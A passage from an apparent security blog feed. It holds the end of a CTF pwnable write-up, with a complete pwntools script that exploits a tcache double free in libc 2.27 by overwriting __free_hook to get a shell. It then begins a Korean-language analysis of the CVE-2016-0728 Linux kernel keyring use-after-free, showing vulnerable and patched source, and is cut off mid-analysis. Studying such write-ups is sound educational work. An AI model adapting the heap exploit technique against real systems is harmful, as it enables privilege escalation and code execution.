class="string">&#x27;bye!&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


<h1 id="Cache-7-pwnable"><a href="#Cache-7-pwnable" class="headerlink" title="Cache_7 (pwnable)"></a>Cache_7 (pwnable)</h1><h2 id="vulnerability-3"><a href="#vulnerability-3" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/113531409-ad360900-9603-11eb-9a03-8f976e9834cd.png" alt="CTF11"></p>
<p>I can’t overwrite plt.got because it is FULL RELRO. I am gonna overwrite _hook address.</p>
<p>Let’s analyze the binary.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/113531606-29305100-9604-11eb-8fe7-896db2202e74.png" alt="123"></p>
<p>Allocate heap memory  here.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/113531642-3fd6a800-9604-11eb-83bb-2ee11ad99ae7.png" alt="456"></p>
<p>Free the memory here.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/113531673-541aa500-9604-11eb-8cec-2bffef0ea6d6.png" alt="789"></p>
<p>And can leak the memory using this.</p>
<p>You know, there is vulnerability about <code>Tcache double free</code> in Ubuntu 18.04 before patching.</p>
<p>And also they gave me the Libc file. It is Libc-2.27, and they gave hint . “Old Ubuntu 18.04”.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/113531879-ed49bb80-9604-11eb-96e6-e007da518756.png" alt="1010"></p>
<p>I tested about it . First I allocated 0x40 size heap. and free the memory three times. The picture above shows that double free is possible.<br>There is no protection about <code>double free</code> in Ubuntu 18.04, but it is patched now.  </p>
<p>Then it is easy to exploit. I use this vulnerability i can leak the memory and also overwrite _hook address. </p>
<h2 id="exploit-3"><a href="#exploit-3" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line"><span class="comment">#p = remote(&#x27;34.121.211.139&#x27;,4444)</span></span><br><span class="line">p = process([<span class="string">&#x27;./chall&#x27;</span>],env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;./libc-2.27.so&#x27;</span>&#125;)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x601050</span></span><br><span class="line">stdin = <span class="number">0x601040</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice :\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;data\n&#x27;</span>,<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice :\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice :\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">add(<span class="number">50</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">50</span>,p64(stdin))</span><br><span class="line">add(<span class="number">50</span>,<span class="string">&#x27;CCCC&#x27;</span>)</span><br><span class="line">add(<span class="number">50</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">view()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;inside\n&#x27;</span>)</span><br><span class="line">leak = u64(p.recvn(<span class="number">6</span>)+<span class="string">&quot;\x00\x00&quot;</span>)</span><br><span class="line">leak = leak + <span class="number">0x76</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(leak)</span><br><span class="line"></span><br><span class="line">libcbase = leak - <span class="number">0x3ec680</span></span><br><span class="line">malloc_hook = libcbase + <span class="number">0x3ebc30</span></span><br><span class="line">free_hook = libcbase + <span class="number">0x3ed8e8</span></span><br><span class="line">oneshot = libcbase + <span class="number">0x4f3c2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">60</span>,<span class="string">&#x27;AAAAA&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">pause()</span><br><span class="line">add(<span class="number">60</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">60</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">add(<span class="number">60</span>,p64(oneshot))</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>




]]></content>
      <categories>
        <category>Write-up</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwnable</tag>
        <tag>write-up</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2016-0728</title>
    <url>/2020/11/02/2020-11-03-CVE-2016-0728/</url>
    <content><![CDATA[<center>CVE-2016-0728 // Linux Kernel 1-day </center>



<h1 id="information"><a href="#information" class="headerlink" title="information"></a>information</h1><p><img src="https://user-images.githubusercontent.com/70257118/95414395-c453b100-0968-11eb-82dd-79b6e5e9e596.png" alt="제목 없음"></p>
<ul>
<li>2016년,리눅스 커널에서 LPE(Local Privilege Escalation)취약점이 발견되었다.</li>
<li>이 취약점은 2012년부터 존재했지만 2016년이 되어서야  취약점이 발견되었다.</li>
<li>당시 수천만대의 Linux 개인 PC와 Server, 66%의 Android device(kit-kat)에 영향을 주었다.</li>
<li>취약점은 32bit,64bit상관없이 발생하며, 4.4.1 버전 이전의 모든 리눅스 커널에서 발생한다.<span id="more"></span>
<img src="https://user-images.githubusercontent.com/70257118/95419567-d4718d80-0974-11eb-97dc-8b0e95991573.png" alt="1"></li>
<li>취약점이 발생하는 환경은 다음과 같으며,  ubuntu 14.04 LTS 환경에서 증명해 보겠다.</li>
</ul>
<h1 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h1><h3 id="Integer-Overflow-trigger"><a href="#Integer-Overflow-trigger" class="headerlink" title="- Integer Overflow (trigger)"></a>- Integer Overflow (trigger)</h3><h3 id="Use-after-free-exploit"><a href="#Use-after-free-exploit" class="headerlink" title="- Use after free (exploit)"></a>- Use after free (exploit)</h3><ul>
<li>Integer Overflow 취약점이 존재하는 부분은 <code>keyctl</code>이라는 커맨드이다.</li>
<li><code>keyctl</code>은 리눅스의 <code>key</code>를 보유 및 관리하는 시스템이다.</li>
<li>keyring은 다른 key(다른 keyring을 포함할 수 있음)에 대한 링크가 포함된 특별한 유형의 key다.</li>
</ul>
<p><img src="https://user-images.githubusercontent.com/70257118/95422776-e48c6b80-097a-11eb-8eb9-d4f58ca5955e.png" alt="2"></p>
<ul>
<li>key는 암호 데이터, 인증 토큰에 대한 구조체이며 아래와 같다.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> &#123;</span></span><br><span class="line">      <span class="keyword">atomic_t</span>                 usage;       <span class="comment">/* number of references */</span></span><br><span class="line">      <span class="keyword">key_serial_t</span>           serial;        <span class="comment">/* key serial number */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">key_type</span>      *<span class="title">type</span>;</span>        <span class="comment">/* type of key */</span></span><br><span class="line">      <span class="keyword">time_t</span>                     expiry;  <span class="comment">/* time at which key expires (or 0) */</span></span><br><span class="line">      <span class="keyword">uid_t</span>                       uid;           <span class="comment">/* UID */</span></span><br><span class="line">      <span class="keyword">gid_t</span>                       gid;           <span class="comment">/* GID */</span></span><br><span class="line">      <span class="keyword">key_perm_t</span>            perm;        <span class="comment">/* access permissions */</span></span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">short</span>       quotalen;   <span class="comment">/* length added to quota */</span></span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">short</span>       datalen;     <span class="comment">/* payload data length</span></span><br><span class="line"><span class="comment">      char                      *description;</span></span><br><span class="line"><span class="comment">      union &#123;</span></span><br><span class="line"><span class="comment">          unsigned long             value;</span></span><br><span class="line"><span class="comment">          void                            *data;</span></span><br><span class="line"><span class="comment">          struct keyring_list       *subscriptions;</span></span><br><span class="line"><span class="comment">      &#125; payload;                                 /* Actual security data */</span></span><br><span class="line">      ....</span><br><span class="line">      ....</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="https://user-images.githubusercontent.com/70257118/98777101-80eed580-2433-11eb-8d64-248ab5469aa7.png" alt="1"></p>
<ul>
<li><p>해당 취약점에서 중요한 변수는 <code>key-&gt;usage</code>이다.</p>
</li>
<li><p><strong>key-&gt;usage의 type은 atomic_t형으로 이는 int형과 같다.</strong></p>
</li>
<li><p>취약점이 발생하는 함수는 <code>join_session_keyring</code>이다.</p>
</li>
</ul>
<p><img src="https://user-images.githubusercontent.com/70257118/95425267-fa039480-097e-11eb-87b5-4820e5629540.png" alt="55"></p>
<ul>
<li><p>keyctl(KEYCTL_JOIN_SESSION_KEYRING, name)을 이용하여 현재의 세션에서 새로운 keyring을 생성할 수 있다.</p>
</li>
<li><p>name이 NULL일 경우 익명, NULL 이 아닐경우 해당 keyring에 이름을 지정할 수 있다.</p>
</li>
<li><p>keyring은 같은 이름의 keyring을 참조하여 서로 다른 프로세스에서 공유할 수 있다.</p>
</li>
<li><p>만약 하나의 keyring이 여러 프로세스에서 공유되고 있다면 usage라는 필드에 위치한 객체의 내부 reference count가 계속해서 증가하게 된다.</p>
</li>
</ul>
<h2 id="source-code-before-the-vulnerability-is-patched"><a href="#source-code-before-the-vulnerability-is-patched" class="headerlink" title="source code, before the vulnerability is patched"></a>source code, before the vulnerability is patched</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">join_session_keyring</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">keyring</span>;</span></span><br><span class="line">	<span class="keyword">long</span> ret, serial;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">new</span> = prepare_creds();</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	old = current_cred();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* if no name is provided, install an anonymous keyring */</span></span><br><span class="line">	<span class="keyword">if</span> (!name) &#123;</span><br><span class="line">		ret = install_session_keyring_to_cred(<span class="keyword">new</span>, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">		serial = <span class="keyword">new</span>-&gt;session_keyring-&gt;serial;</span><br><span class="line">		ret = commit_creds(<span class="keyword">new</span>);</span><br><span class="line">		<span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">			ret = serial;</span><br><span class="line">		<span class="keyword">goto</span> okay;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* allow the user to join or create a named keyring */</span></span><br><span class="line">	mutex_lock(&amp;key_session_mutex);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* look for an existing keyring of this name */</span></span><br><span class="line">	keyring = find_keyring_by_name(name, <span class="literal">false</span>); <span class="comment">// find_keyring_by_name increments keyring usage if a keyring was found</span></span><br><span class="line">    </span><br><span class="line">	<span class="keyword">if</span> (PTR_ERR(keyring) == -ENOKEY) &#123;</span><br><span class="line">		<span class="comment">/* not found - try and create a new one */</span></span><br><span class="line">		keyring = keyring_alloc(</span><br><span class="line">			name, old-&gt;uid, old-&gt;gid, old,</span><br><span class="line">			KEY_POS_ALL | KEY_USR_VIEW | KEY_USR_READ | KEY_USR_LINK,</span><br><span class="line">			KEY_ALLOC_IN_QUOTA, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(keyring)) &#123;</span><br><span class="line">			ret = PTR_ERR(keyring);</span><br><span class="line">			<span class="keyword">goto</span> error2;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_ERR(keyring)) &#123; </span><br><span class="line">		ret = PTR_ERR(keyring);</span><br><span class="line">		<span class="keyword">goto</span> error2; </span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">		ret = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">goto</span> error2;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* we&#x27;ve got a keyring - now to install it */</span></span><br><span class="line">	ret = install_session_keyring_to_cred(<span class="keyword">new</span>, keyring);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error2;</span><br><span class="line"></span><br><span class="line">	commit_creds(<span class="keyword">new</span>);</span><br><span class="line">	mutex_unlock(&amp;key_session_mutex); </span><br><span class="line"></span><br><span class="line">	ret = keyring-&gt;serial; </span><br><span class="line">	key_put(keyring); </span><br><span class="line">okay:</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">error2:</span><br><span class="line">	mutex_unlock(&amp;key_session_mutex);</span><br><span class="line">error:</span><br><span class="line">	abort_creds(<span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">return</span> ret; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="source-code-after-the-vulnerability-is-patched"><a href="#source-code-after-the-vulnerability-is-patched" class="headerlink" title="source code, after the vulnerability is patched"></a>source code, after the vulnerability is patched</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">join_session_keyring</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">keyring</span>;</span></span><br><span class="line">	<span class="keyword">long</span> ret, serial;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">new</span> = prepare_creds();</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	old = current_cred();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* if no name is provided, install an anonymous keyring */</span></span><br><span class="line">	<span class="keyword">if</span> (!name) &#123;</span><br><span class="line">		ret = install_session_keyring_to_cred(<span class="keyword">new</span>, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">		serial = <span class="keyword">new</span>-&gt;session_keyring-&gt;serial;</span><br><span class="line">		ret = commit_creds(<span class="keyword">new</span>);</span><br><span class="line">		<span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">			ret = serial;</span><br><span class="line">		<span class="keyword">goto</span> okay;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* allow the user to join or create a named keyring */</span></span><br><span class="line">	mutex_lock(&amp;key_session_mutex);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* look for an existing keyring of this name */</span></span><br><span class="line">	keyring = find_keyring_by_name(name, <span class="literal">false</span>);</span><br><span class="line">	<span class="keyword">if</span> (PTR_ERR(keyring) == -ENOKEY) &#123;</span><br><span class="line">		<span class="comment">/* not found - try and create a new one */</span></span><br><span class="line">		keyring = keyring_alloc(</span><br><span class="line">			name, old-&gt;uid, old-&gt;gid, old,</span><br><span class="line">			KEY_POS_ALL | KEY_USR_VIEW | KEY_USR_READ | KEY_USR_LINK,</span><br><span class="line">			KEY_ALLOC_IN_QUOTA, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(keyring)) &#123;</span><br><span class="line">			ret = PTR_ERR(keyring);</span><br><span class="line">			<span class="keyword">goto</span> error2;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_ERR(keyring)) &#123;</span><br><span class="line">		ret = PTR_ERR(keyring);</span><br><span class="line">		<span class="keyword">goto</span> error2;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">		key_put(keyring);</span><br><span class="line">		ret = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">goto</span> error2;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* we&#x27;ve got a keyring - now to install it */</span></span><br><span class="line">	ret = install_session_keyring_to_cred(<span class="keyword">new</span>, keyring);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error2;</span><br><span class="line"></span><br><span class="line">	commit_creds(<span class="keyword">new</span>);</span><br><span class="line">	mutex_unlock(&amp;key_session_mutex);</span><br><span class="line"></span><br><span class="line">	ret = keyring-&gt;serial;</span><br><span class="line">	key_put(keyring);</span><br><span class="line">okay:</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">error2:</span><br><span class="line">	mutex_unlock(&amp;key_session_mutex);</span><br><span class="line">error:</span><br><span class="line">	abort_creds(<span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">return</span> ret; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h2 id="the-difference-between-these-code"><a href="#the-difference-between-these-code" class="headerlink" title="the difference between these code"></a>the difference between these code</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Before</span></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">		ret = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">goto</span> error2;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//After</span></span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">		key_put(keyring); <span class="comment">//patched</span></span><br><span class="line">		ret = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">goto</span> error2;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>패치된 코드를 보면, else if 문에서 goto error2이전에 key_put(keyring)이라는 코드가 추가되었다.<h3 id="key-put"><a href="#key-put" class="headerlink" title="key_put()"></a>key_put()</h3></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">key_put</span><span class="params">(struct key *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (key) &#123;</span><br><span class="line">		key_check(key);</span><br><span class="line">		<span class="keyword">if</span> (refcount_dec_and_test(&amp;key-&gt;usage))</span><br><span class="line">			schedule_work(&amp;key_gc_work);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(key_put);</span><br></pre></td></tr></table></figure>
<ul>
<li><p>key_put 함수는 해당 keyring의 usage (<code>reference count</code>) 를 감소시키는 역할을 한다.</p>
</li>
<li><p>추가적으로 <code>reference count</code>가 0이 되어 더이상 사용되지 않는 메모리가 된다면, 해당 포인터를 리눅스의 Garbage Colllector가 free 시킨다.</p>
</li>
</ul>
<h1 id="source-code-analysis"><a href="#source-code-analysis" class="headerlink" title="source code analysis"></a>source code analysis</h1><ul>
<li>join_session_keyring 함수를 크게 세 부분으로 나눠서 분석하겠다.<h2 id="part-1-cred-구조체-초기화"><a href="#part-1-cred-구조체-초기화" class="headerlink" title="part 1 : cred 구조체 초기화"></a>part 1 : cred 구조체 초기화</h2></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">join_session_keyring</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">keyring</span>;</span></span><br><span class="line">	<span class="keyword">long</span> ret, serial;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">new</span> = prepare_creds();</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	old = current_cred();</span><br></pre></td></tr></table></figure>
<ul>
<li>join_session_keyring 함수가 호출되면 prepare_creds()함수를 통해 수정용 cred 구조체 new를 초기화 해준다.</li>
<li>current_cred()를 통해 현재 작업의 subjective credentials를 액세스 한다.</li>
</ul>
<h3 id="prepare-creds"><a href="#prepare-creds" class="headerlink" title="prepare_creds()"></a>prepare_creds()</h3><p><img src="https://user-images.githubusercontent.com/70257118/98334793-07c43c80-2047-11eb-98a0-adaaee9c304d.png" alt="제목 없음"></p>
<ul>
<li>Task의 creds는 직접적으로 수정할 수 없어 반드시 copy 후 수정해야 한다.</li>
<li>prepare_creds()를 호출하여 copy를 준비 한다. (new = prepare_creds())</li>
<li>수정 후 commit_creds()를 호출하여 커밋한다. (commit_creds(new))</li>
</ul>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">struct cred *<span class="title">prepare_creds</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line">	validate_process_creds();</span><br><span class="line">	<span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	kdebug(<span class="string">&quot;prepare_creds() alloc %p&quot;</span>, <span class="keyword">new</span>);</span><br><span class="line">	old = task-&gt;cred;</span><br><span class="line">	<span class="built_in">memcpy</span>(<span class="keyword">new</span>, old, <span class="keyword">sizeof</span>(struct cred));</span><br><span class="line">	atomic_set(&amp;<span class="keyword">new</span>-&gt;usage, <span class="number">1</span>);</span><br><span class="line">	set_cred_subscribers(<span class="keyword">new</span>, <span class="number">0</span>);</span><br><span class="line">	get_group_info(<span class="keyword">new</span>-&gt;group_info);</span><br><span class="line">	get_uid(<span class="keyword">new</span>-&gt;user);</span><br><span class="line">	get_user_ns(<span class="keyword">new</span>-&gt;user_ns);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	key_get(<span class="keyword">new</span>-&gt;session_keyring); 	</span><br><span class="line">	key_get(<span class="keyword">new</span>-&gt;process_keyring);</span><br><span class="line">	key_get(<span class="keyword">new</span>-&gt;thread_keyring);</span><br><span class="line">	key_get(<span class="keyword">new</span>-&gt;request_key_auth);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">new</span>-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">if</span> (security_prepare_creds(<span class="keyword">new</span>, old, GFP_KERNEL) &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line">	validate_creds(<span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span>;</span><br><span class="line">error:</span><br><span class="line">	abort_creds(<span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li> 수정용 cred 구조체를 만들어 return 해준다.</li>
</ul>
<h3 id="what-is-struct-cred"><a href="#what-is-struct-cred" class="headerlink" title="what is struct cred?"></a>what is struct cred?</h3><p><img src="https://user-images.githubusercontent.com/70257118/98340730-2cbdad00-2051-11eb-8409-1ff1950ac625.png" alt="1"></p>
<ul>
<li>Credentials : 자격증명</li>
<li>Linux에서는 다음과 같은 Credentials들을 <code>struct cred</code>를 통해 관리한다.<br>  Traditional UNIX credentials.<br>  Capabilities.<br>  Secure management flags (securebits).<br>  Keys and keyrings.<br>  LSM<br>  AF_KEY </li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="keyword">void</span>		*put_addr;</span><br><span class="line">	<span class="keyword">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="keyword">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>		*security;	